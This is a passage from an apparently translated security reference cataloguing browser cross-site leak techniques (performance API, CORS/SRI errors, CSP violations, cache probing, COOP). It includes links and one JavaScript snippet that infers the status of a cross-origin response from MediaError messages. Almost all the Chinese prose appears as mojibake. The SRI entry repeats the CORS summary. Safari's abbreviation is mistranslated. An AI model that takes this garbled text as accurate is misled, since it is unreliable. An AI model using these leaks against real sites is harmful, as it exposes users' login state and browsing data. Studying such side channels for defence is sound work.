* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

ä¸æè¿°çš„ XS-Leak ç±»ä¼¼ï¼Œç”±äº ContentDisposition å¤´ï¼Œ**è¢«ä¸‹è½½çš„èµ„æº**ä¹Ÿ**ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚æ­¤æŠ€æœ¯åœ¨æ‰€æœ‰ä¸»è¦æµè§ˆå™¨ä¸­å‡æœ‰æ•ˆã€‚

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** èµ„æºè®¡æ—¶æ¡ç›®æ³„éœ²é‡å®šå‘çš„å¼€å§‹æ—¶é—´ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

æˆ‘ä»¬å‘ç°ä¸€ä¸ª XS-Leak å®ä¾‹ï¼Œåˆ©ç”¨æŸäº›æµè§ˆå™¨è®°å½•è¿‡å¤šè·¨æºè¯·æ±‚ä¿¡æ¯çš„è¡Œä¸ºã€‚æ ‡å‡†å®šä¹‰äº†ä¸€ç»„åº”ä¸ºè·¨æºèµ„æºè®¾ç½®ä¸ºé›¶çš„å±æ€§ã€‚ç„¶è€Œï¼Œåœ¨**SA**ä¸­ï¼Œå¯ä»¥é€šè¿‡æŸ¥è¯¢**æ€§èƒ½ API**å¹¶æ£€æŸ¥**redirectStart è®¡æ—¶æ•°æ®**æ¥æ£€æµ‹ç”¨æˆ·æ˜¯å¦è¢«ç›®æ ‡é¡µé¢**é‡å®šå‘**ã€‚

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** å½“å‘ç”Ÿé‡å®šå‘æ—¶ï¼Œè®¡æ—¶æ¡ç›®çš„æŒç»­æ—¶é—´ä¸ºè´Ÿã€‚
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

åœ¨ GC ä¸­ï¼Œå¯¼è‡´**é‡å®šå‘**çš„è¯·æ±‚çš„**æŒç»­æ—¶é—´**ä¸º**è´Ÿ**ï¼Œå› æ­¤å¯ä»¥ä¸ä¸å¯¼è‡´é‡å®šå‘çš„è¯·æ±‚**åŒºåˆ†**å¼€æ¥ã€‚

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** å— CORP ä¿æŠ¤çš„èµ„æºä¸ä¼šåˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**nextHopProtocol æ¡ç›®**å¯ä»¥ç”¨ä½œæ³„éœ²æŠ€æœ¯ã€‚åœ¨ GC ä¸­ï¼Œå½“è®¾ç½®**CORP å¤´**æ—¶ï¼ŒnextHopProtocol å°†æ˜¯**ç©º**çš„ã€‚è¯·æ³¨æ„ï¼ŒSA å¯¹äºå¯ç”¨ CORP çš„èµ„æºæ ¹æœ¬ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®ã€‚

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API Usage
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** æ£€æµ‹ç‰¹å®šæºæ˜¯å¦æ³¨å†Œäº†æœåŠ¡å·¥ä½œè€…ã€‚
* **Code Example**:

æœåŠ¡å·¥ä½œè€…æ˜¯äº‹ä»¶é©±åŠ¨çš„è„šæœ¬ä¸Šä¸‹æ–‡ï¼Œåœ¨ä¸€ä¸ªæºä¸Šè¿è¡Œã€‚å®ƒä»¬åœ¨ç½‘é¡µçš„åå°è¿è¡Œï¼Œå¯ä»¥æ‹¦æˆªã€ä¿®æ”¹å’Œ**ç¼“å­˜èµ„æº**ä»¥åˆ›å»ºç¦»çº¿ Web åº”ç”¨ç¨‹åºã€‚\
å¦‚æœé€šè¿‡**iframe**è®¿é—®**æœåŠ¡å·¥ä½œè€…**ç¼“å­˜çš„**èµ„æº**ï¼Œè¯¥èµ„æºå°†ä»**æœåŠ¡å·¥ä½œè€…ç¼“å­˜**ä¸­**åŠ è½½**ã€‚\
è¦æ£€æµ‹èµ„æºæ˜¯å¦**ä»æœåŠ¡å·¥ä½œè€…**ç¼“å­˜ä¸­**åŠ è½½**ï¼Œå¯ä»¥ä½¿ç”¨**æ€§èƒ½ API**ã€‚\
è¿™ä¹Ÿå¯ä»¥é€šè¿‡è®¡æ—¶æ”»å‡»æ¥å®Œæˆï¼ˆæœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹è®ºæ–‡ï¼‰ã€‚

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** å¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦å­˜å‚¨åœ¨ç¼“å­˜ä¸­ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

ä½¿ç”¨ [Performance API](./#performance-api) å¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦è¢«ç¼“å­˜ã€‚

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** å¯ä»¥ä» `performance` API ä¸­æ£€ç´¢è¯·æ±‚çš„ç½‘ç»œæŒç»­æ—¶é—´ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** åœ¨ Firefox ä¸­ï¼Œå¯ä»¥å‡†ç¡®æ³„éœ²è·¨æºè¯·æ±‚çš„çŠ¶æ€ç ã€‚
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` æ¥å£çš„ message å±æ€§å”¯ä¸€æ ‡è¯†æˆåŠŸåŠ è½½çš„èµ„æºï¼Œå…·æœ‰ç‹¬ç‰¹çš„å­—ç¬¦ä¸²ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡è§‚å¯Ÿæ¶ˆæ¯å†…å®¹æ¥åˆ©ç”¨æ­¤ç‰¹æ€§ï¼Œä»è€Œæ¨æ–­è·¨æºèµ„æºçš„å“åº”çŠ¶æ€ã€‚

### CORS é”™è¯¯

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: Header
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **æ€»ç»“:** åœ¨å®‰å…¨å£°æ˜ (SA) ä¸­ï¼ŒCORS é”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æš´éœ²äº†é‡å®šå‘è¯·æ±‚çš„å®Œæ•´ URLã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

æ­¤æŠ€æœ¯ä½¿æ”»å‡»è€…èƒ½å¤Ÿ**æå–è·¨æºç«™ç‚¹é‡å®šå‘çš„ç›®æ ‡**ï¼Œé€šè¿‡åˆ©ç”¨åŸºäº Webkit çš„æµè§ˆå™¨å¤„ç† CORS è¯·æ±‚çš„æ–¹å¼ã€‚å…·ä½“è€Œè¨€ï¼Œå½“å‘ç›®æ ‡ç«™ç‚¹å‘é€**å¯ç”¨ CORS çš„è¯·æ±‚**ï¼Œè¯¥ç«™ç‚¹æ ¹æ®ç”¨æˆ·çŠ¶æ€å‘å‡ºé‡å®šå‘ï¼Œè€Œæµè§ˆå™¨éšåæ‹’ç»è¯¥è¯·æ±‚æ—¶ï¼Œ**é‡å®šå‘ç›®æ ‡çš„å®Œæ•´ URL**ä¼šåœ¨é”™è¯¯æ¶ˆæ¯ä¸­æŠ«éœ²ã€‚æ­¤æ¼æ´ä¸ä»…æ­ç¤ºäº†é‡å®šå‘çš„äº‹å®ï¼Œè¿˜æš´éœ²äº†é‡å®šå‘çš„ç«¯ç‚¹åŠå…¶å¯èƒ½åŒ…å«çš„ä»»ä½•**æ•æ„ŸæŸ¥è¯¢å‚æ•°**ã€‚

### SRI é”™è¯¯

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: Header
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **æ€»ç»“:** åœ¨å®‰å…¨å£°æ˜ (SA) ä¸­ï¼ŒCORS é”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æš´éœ²äº†é‡å®šå‘è¯·æ±‚çš„å®Œæ•´ URLã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨**è¯¦ç»†çš„é”™è¯¯æ¶ˆæ¯**æ¨æ–­è·¨æºå“åº”çš„å¤§å°ã€‚è¿™æ˜¯ç”±äºå­èµ„æºå®Œæ•´æ€§ (SRI) çš„æœºåˆ¶ï¼Œè¯¥æœºåˆ¶ä½¿ç”¨å®Œæ•´æ€§å±æ€§éªŒè¯ä» CDN è·å–çš„èµ„æºæœªè¢«ç¯¡æ”¹ã€‚ä¸ºäº†ä½¿ SRI åœ¨è·¨æºèµ„æºä¸Šå·¥ä½œï¼Œè¿™äº›èµ„æºå¿…é¡»æ˜¯**å¯ç”¨ CORS çš„**ï¼›å¦åˆ™ï¼Œå®ƒä»¬ä¸å—å®Œæ•´æ€§æ£€æŸ¥ã€‚åœ¨å®‰å…¨å£°æ˜ (SA) ä¸­ï¼Œç±»ä¼¼äº CORS é”™è¯¯ XS-Leakï¼Œå½“å¸¦æœ‰å®Œæ•´æ€§å±æ€§çš„ fetch è¯·æ±‚å¤±è´¥æ—¶ï¼Œå¯ä»¥æ•è·é”™è¯¯æ¶ˆæ¯ã€‚æ”»å‡»è€…å¯ä»¥æ•…æ„**è§¦å‘æ­¤é”™è¯¯**ï¼Œé€šè¿‡å°†**è™šå‡çš„å“ˆå¸Œå€¼**åˆ†é…ç»™ä»»ä½•è¯·æ±‚çš„å®Œæ•´æ€§å±æ€§ã€‚åœ¨ SA ä¸­ï¼Œç»“æœé”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æ­ç¤ºäº†è¯·æ±‚èµ„æºçš„å†…å®¹é•¿åº¦ã€‚è¿™ä¸€ä¿¡æ¯æ³„éœ²ä½¿æ”»å‡»è€…èƒ½å¤Ÿè¯†åˆ«å“åº”å¤§å°çš„å˜åŒ–ï¼Œä¸ºå¤æ‚çš„ XS-Leak æ”»å‡»é“ºå¹³äº†é“è·¯ã€‚

### CSP è¿è§„/æ£€æµ‹

* **åŒ…å«æ–¹æ³•**: å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **æ€»ç»“:** å¦‚æœæˆ‘ä»¬è®¿é—®çš„å—å®³è€…ç½‘ç«™å°è¯•é‡å®šå‘åˆ°ä¸åŒçš„åŸŸï¼ŒCSP å°†è§¦å‘å¯æ£€æµ‹çš„é”™è¯¯ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak å¯ä»¥ä½¿ç”¨ CSP æ£€æµ‹è·¨æºç«™ç‚¹æ˜¯å¦é‡å®šå‘åˆ°ä¸åŒçš„æºã€‚æ­¤æ³„æ¼å¯ä»¥æ£€æµ‹é‡å®šå‘ï¼Œä½†æ­¤å¤–ï¼Œé‡å®šå‘ç›®æ ‡çš„åŸŸä¹Ÿä¼šæ³„æ¼ã€‚æ­¤æ”»å‡»çš„åŸºæœ¬æ€è·¯æ˜¯**åœ¨æ”»å‡»è€…ç½‘ç«™ä¸Šå…è®¸ç›®æ ‡åŸŸ**ã€‚ä¸€æ—¦å‘ç›®æ ‡åŸŸå‘å‡ºè¯·æ±‚ï¼Œå®ƒ**é‡å®šå‘**åˆ°ä¸€ä¸ªè·¨æºåŸŸã€‚**CSP é˜»æ­¢**å¯¹å…¶çš„è®¿é—®å¹¶åˆ›å»ºä¸€ä¸ª**è¿è§„æŠ¥å‘Šä½œä¸ºæ³„æ¼æŠ€æœ¯**ã€‚æ ¹æ®æµè§ˆå™¨çš„ä¸åŒï¼Œ**æ­¤æŠ¥å‘Šå¯èƒ½æ³„æ¼é‡å®šå‘çš„ç›®æ ‡ä½ç½®**ã€‚\
ç°ä»£æµè§ˆå™¨ä¸ä¼šæŒ‡ç¤ºé‡å®šå‘åˆ°çš„ URLï¼Œä½†æ‚¨ä»ç„¶å¯ä»¥æ£€æµ‹åˆ°è§¦å‘äº†è·¨æºé‡å®šå‘ã€‚

### ç¼“å­˜

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶, å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **æ€»ç»“:** ä»ç¼“å­˜ä¸­æ¸…é™¤æ–‡ä»¶ã€‚æ‰“å¼€ç›®æ ‡é¡µé¢æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨äºç¼“å­˜ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹:**

æµè§ˆå™¨å¯èƒ½ä¸ºæ‰€æœ‰ç½‘ç«™ä½¿ç”¨ä¸€ä¸ªå…±äº«ç¼“å­˜ã€‚æ— è®ºå…¶æ¥æºå¦‚ä½•ï¼Œéƒ½å¯ä»¥æ¨æ–­ç›®æ ‡é¡µé¢æ˜¯å¦**è¯·æ±‚äº†ç‰¹å®šæ–‡ä»¶**ã€‚

å¦‚æœä¸€ä¸ªé¡µé¢ä»…åœ¨ç”¨æˆ·ç™»å½•æ—¶åŠ è½½å›¾åƒï¼Œæ‚¨å¯ä»¥**ä½¿èµ„æºå¤±æ•ˆ**ï¼ˆä»¥ä¾¿å¦‚æœå®ƒè¢«ç¼“å­˜åˆ™ä¸å†ç¼“å­˜ï¼Œæ›´å¤šä¿¡æ¯é“¾æ¥ï¼‰ï¼Œ**æ‰§è¡Œè¯·æ±‚**ä»¥åŠ è½½è¯¥èµ„æºï¼Œå¹¶å°è¯•ä½¿ç”¨**é”™è¯¯è¯·æ±‚**åŠ è½½è¯¥èµ„æºï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨è¿‡é•¿çš„ referer å¤´ï¼‰ã€‚å¦‚æœèµ„æºåŠ è½½**æ²¡æœ‰è§¦å‘ä»»ä½•é”™è¯¯**ï¼Œåˆ™æ˜¯å› ä¸ºå®ƒè¢«**ç¼“å­˜**ã€‚

### CSP æŒ‡ä»¤

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**: Header
* **æ›´å¤šä¿¡æ¯**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **æ€»ç»“:** CSP å¤´æŒ‡ä»¤å¯ä»¥é€šè¿‡ CSP iframe å±æ€§è¿›è¡Œæ¢æµ‹ï¼Œæ­ç¤ºç­–ç•¥ç»†èŠ‚ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome (GC) ä¸­çš„ä¸€ä¸ªæ–°åŠŸèƒ½å…è®¸ç½‘é¡µé€šè¿‡åœ¨ iframe å…ƒç´ ä¸Šè®¾ç½®å±æ€§æ¥**æè®®å†…å®¹å®‰å…¨ç­–ç•¥ (CSP)**ï¼Œå¹¶å°†ç­–ç•¥æŒ‡ä»¤ä¸ HTTP è¯·æ±‚ä¸€èµ·ä¼ è¾“ã€‚é€šå¸¸ï¼ŒåµŒå…¥çš„å†…å®¹å¿…é¡»**é€šè¿‡ HTTP å¤´è¿›è¡Œæˆæƒ**ï¼Œå¦åˆ™å°†**æ˜¾ç¤ºé”™è¯¯é¡µé¢**ã€‚ç„¶è€Œï¼Œå¦‚æœ iframe å·²ç»å—åˆ° CSP çš„ç®¡ç†ï¼Œå¹¶ä¸”æ–°æè®®çš„ç­–ç•¥ä¸æ›´ä¸¥æ ¼ï¼Œåˆ™é¡µé¢å°†æ­£å¸¸åŠ è½½ã€‚æ­¤æœºåˆ¶ä¸ºæ”»å‡»è€…æ‰“å¼€äº†ä¸€æ¡è·¯å¾„ï¼Œé€šè¿‡è¯†åˆ«é”™è¯¯é¡µé¢æ¥**æ£€æµ‹è·¨æºé¡µé¢çš„ç‰¹å®š CSP æŒ‡ä»¤**ã€‚å°½ç®¡æ­¤æ¼æ´è¢«æ ‡è®°ä¸ºå·²ä¿®å¤ï¼Œä½†æˆ‘ä»¬çš„å‘ç°æ­ç¤ºäº†ä¸€ç§**æ–°çš„æ³„æ¼æŠ€æœ¯**ï¼Œèƒ½å¤Ÿæ£€æµ‹é”™è¯¯é¡µé¢ï¼Œè¡¨æ˜æ ¹æœ¬é—®é¢˜ä»æœªå®Œå…¨è§£å†³ã€‚

### **CORP**

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: Header
* **æ›´å¤šä¿¡æ¯**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **æ€»ç»“:** ä½¿ç”¨è·¨æºèµ„æºç­–ç•¥ (CORP) ä¿æŠ¤çš„èµ„æºåœ¨ä»ä¸å…è®¸çš„æºè·å–æ—¶ä¼šæŠ›å‡ºé”™è¯¯ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP å¤´æ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒæ–°çš„ç½‘ç»œå¹³å°å®‰å…¨ç‰¹æ€§ï¼Œå½“è®¾ç½®æ—¶**é˜»æ­¢å¯¹ç»™å®šèµ„æºçš„æ—  CORS è·¨æºè¯·æ±‚**ã€‚å¯ä»¥æ£€æµ‹åˆ°è¯¥å¤´çš„å­˜åœ¨ï¼Œå› ä¸ºå— CORP ä¿æŠ¤çš„èµ„æºåœ¨è·å–æ—¶ä¼š**æŠ›å‡ºé”™è¯¯**ã€‚

### CORB

* **åŒ…å«æ–¹æ³•**: HTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: Headers
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **æ€»ç»“**: CORB å¯ä»¥å…è®¸æ”»å‡»è€…æ£€æµ‹è¯·æ±‚ä¸­æ˜¯å¦å­˜åœ¨**`nosniff` å¤´**ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

è¯·æŸ¥çœ‹é“¾æ¥ä»¥è·å–æœ‰å…³æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

### CORS é”™è¯¯åœ¨æºåå°„é”™è¯¯é…ç½® <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: Headers
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **æ€»ç»“**: å¦‚æœ Origin å¤´åœ¨ `Access-Control-Allow-Origin` å¤´ä¸­è¢«åå°„ï¼Œåˆ™å¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦å·²ç»åœ¨ç¼“å­˜ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

å¦‚æœ**Origin å¤´**åœ¨ `Access-Control-Allow-Origin` å¤´ä¸­è¢«**åå°„**ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤è¡Œä¸ºå°è¯•åœ¨**CORS** æ¨¡å¼ä¸‹**è·å–**è¯¥**èµ„æº**ã€‚å¦‚æœ**æ²¡æœ‰**è§¦å‘**é”™è¯¯**ï¼Œåˆ™æ„å‘³ç€å®ƒæ˜¯**æ­£ç¡®åœ°ä»ç½‘ç»œè·å–çš„**ï¼›å¦‚æœè§¦å‘äº†é”™è¯¯ï¼Œåˆ™æ˜¯å› ä¸ºå®ƒæ˜¯**ä»ç¼“å­˜ä¸­è®¿é—®çš„**ï¼ˆé”™è¯¯å‡ºç°æ˜¯å› ä¸ºç¼“å­˜ä¿å­˜äº†ä¸€ä¸ªå¸¦æœ‰å…è®¸åŸå§‹åŸŸè€Œä¸æ˜¯æ”»å‡»è€…åŸŸçš„ CORS å¤´çš„å“åº”ï¼‰ã€‚\
è¯·æ³¨æ„ï¼Œå¦‚æœåŸç‚¹æœªè¢«åå°„ä½†ä½¿ç”¨äº†é€šé…ç¬¦ï¼ˆ`Access-Control-Allow-Origin: *`ï¼‰ï¼Œåˆ™æ­¤æ–¹æ³•å°†æ— æ•ˆã€‚

## å¯è¯»å±æ€§æŠ€æœ¯

### Fetch é‡å®šå‘

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **æ€»ç»“:** GC å’Œ SA å…è®¸åœ¨é‡å®šå‘å®Œæˆåæ£€æŸ¥å“åº”çš„ç±»å‹ï¼ˆopaque-redirectï¼‰ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

ä½¿ç”¨ Fetch API æäº¤è¯·æ±‚ï¼Œè®¾ç½® `redirect: "manual"` å’Œå…¶ä»–å‚æ•°ï¼Œå¯ä»¥è¯»å– `response.type` å±æ€§ï¼Œå¦‚æœå®ƒç­‰äº `opaqueredirect`ï¼Œåˆ™å“åº”æ˜¯é‡å®šå‘ã€‚

### COOP

* **åŒ…å«æ–¹æ³•**: å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: Header
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **æ€»ç»“:** å—è·¨æºæ‰“å¼€ç­–ç•¥ (COOP) ä¿æŠ¤çš„é¡µé¢é˜²æ­¢è·¨æºäº¤äº’çš„è®¿é—®ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

æ”»å‡»è€…èƒ½å¤Ÿæ¨æ–­è·¨æº HTTP å“åº”ä¸­è·¨æºæ‰“å¼€ç­–ç•¥ (COOP) å¤´çš„å­˜åœ¨ã€‚COOP è¢«ç½‘ç»œåº”ç”¨ç¨‹åºç”¨äºé˜»æ­¢å¤–éƒ¨ç«™ç‚¹è·å–ä»»æ„çª—å£å¼•ç”¨ã€‚å¯ä»¥é€šè¿‡å°è¯•è®¿é—®**`contentWindow` å¼•ç”¨**æ¥è¯†åˆ«æ­¤å¤´çš„å¯è§æ€§ã€‚åœ¨ COOP æœ‰æ¡ä»¶åº”ç”¨çš„æƒ…å†µä¸‹ï¼Œ**`opener` å±æ€§**æˆä¸ºä¸€ä¸ªæ˜æ˜¾çš„æŒ‡ç¤ºå™¨ï¼šå½“ COOP æ´»åŠ¨æ—¶ï¼Œå®ƒæ˜¯**æœªå®šä¹‰çš„**ï¼Œè€Œåœ¨æ²¡æœ‰ COOP çš„æƒ…å†µä¸‹æ˜¯**å®šä¹‰çš„**ã€‚

### URL æœ€å¤§é•¿åº¦ - æœåŠ¡å™¨ç«¯

* **åŒ…å«æ–¹æ³•**: Fetch API, HTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç  / å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **æ€»ç»“:** æ£€æµ‹å“åº”ä¸­çš„å·®å¼‚ï¼Œå› ä¸ºé‡å®šå‘å“åº”é•¿åº¦å¯èƒ½è¿‡å¤§ï¼ŒæœåŠ¡å™¨ä¼šå›å¤é”™è¯¯å¹¶ç”Ÿæˆè­¦æŠ¥ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

å¦‚æœæœåŠ¡å™¨ç«¯é‡å®šå‘ä½¿ç”¨**ç”¨æˆ·è¾“å…¥è¿›è¡Œé‡å®šå‘**å’Œ**é¢å¤–æ•°æ®**ã€‚å¯ä»¥æ£€æµ‹åˆ°è¿™ç§è¡Œä¸ºï¼Œå› ä¸ºé€šå¸¸**æœåŠ¡å™¨**æœ‰**è¯·æ±‚é•¿åº¦é™åˆ¶**ã€‚å¦‚æœ**ç”¨æˆ·æ•°æ®**æ˜¯**é•¿åº¦ - 1**ï¼Œå› ä¸º**é‡å®šå‘**ä½¿ç”¨**è¯¥æ•°æ®**å¹¶**æ·»åŠ **ä¸€äº›**é¢å¤–çš„å†…å®¹**ï¼Œå®ƒå°†è§¦å‘ä¸€ä¸ª**å¯é€šè¿‡é”™è¯¯äº‹ä»¶æ£€æµ‹åˆ°çš„é”™è¯¯**ã€‚

